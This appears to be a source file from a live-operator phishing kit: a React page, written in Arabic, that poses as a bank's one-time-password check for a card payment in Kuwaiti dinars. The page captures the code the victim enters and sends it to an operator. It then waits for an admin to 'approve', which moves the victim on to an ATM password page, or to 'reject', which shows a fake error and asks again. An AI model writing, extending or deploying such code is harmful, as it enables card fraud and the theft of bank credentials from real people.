import { useEffect, useState, useRef } from "react";
import { useLocation } from "@/lib/wouterShim";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function OTPVerification() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [resendTimer, setResendTimer] = useState(120); // 2 minutes countdown
  const [canResend, setCanResend] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const inputRef = useRef<HTMLInputElement>(null);

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  const totalAmount = paymentData.totalPaid || 0;
  const serviceName = "كي دي دي";
  
  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("رمز التحقق (OTP)");
  }, []);

  // Resend timer countdown
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [resendTimer]);

  // Real-time clock update
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to ATM password page
        navigate("/atm-password");
      } else if (action.action === "reject") {
        // Show error and clear OTP
        setOtp("");
        setError(true);
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
    setError(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Accept 4 or 6 digits
    if (otp.length !== 4 && otp.length !== 6) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: otp,
      current: "رمز التحقق (OTP)",
      nextPage: "كلمة مرور ATM",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setResendTimer(120);
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });
  };

  // Format timer as MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Format date in Arabic
  const formatDate = (date: Date) => {
    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "numeric",
      day: "numeric",
    });
  };

  // Format time in Arabic
  const formatTime = (date: Date) => {
    return date.toLocaleTimeString("ar-SA", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };


  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق لمرة واحدة (OTP)</h1>
          <p className="text-gray-600 text-sm">
            لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
          </p>
        </div>

        {/* Bank and Card Type Logos */}
        <div className="flex justify-between items-center mb-6 px-4">
          {/* Card Type Logo (Visa/Mastercard) */}
          <div className="flex items-center">
            <img
              src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
              alt={cardInfo?.cardType || 'Card'}
              className="h-10 object-contain"
            />
          </div>
          {/* Bank name + logo (logo only if it loads) */}
          {!!cardInfo?.bankName && (
            <div className="flex items-center gap-2">
              {!!cardInfo?.bankLogo && (
                <img
                  src={cardInfo.bankLogo}
                  alt=""
                  className="h-10 object-contain"
                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                />
              )}
            </div>
          )}
        </div>

        {/* Transaction Info */}
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
          <p>
            سيتم الاتصال بك أو إرسال رمز من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-bold">{cardLast4}</span>. يرجى إدخال رمز التحقق لتأكيد العملية.
          </p>
          <p className="mt-2">
            أنت تدفع لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold text-primary">{totalAmount} د.ك</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
          </p>
        </div>

        {/* Success Message */}
        <div className="text-center mb-4">
          <span className="text-primary font-medium">تم إرسال الرمز بنجاح</span>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* OTP Input - Single input field */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="tel"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={handleChange}
              placeholder="رمز التحقق (OTP)"
              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-gray-300"}`}
              autoFocus
            />
          </div>

          {error && (
            <p className="text-red-500 text-sm text-center font-medium">
              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
            </p>
          )}

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full h-12 text-base" 
            disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
          >
            {isWaiting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>جاري التحقق...</span>
              </div>
            ) : (
              "تحقق"
            )}
          </Button>

          {/* Resend Timer */}
          <div className="text-center text-gray-600 text-sm">
            {canResend ? (
              <button
                type="button"
                onClick={handleResend}
                className="text-primary hover:underline font-medium"
              >
                إعادة إرسال الرمز
              </button>
            ) : (
              <span>إعادة إرسال: {formatTimer(resendTimer)}</span>
            )}
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
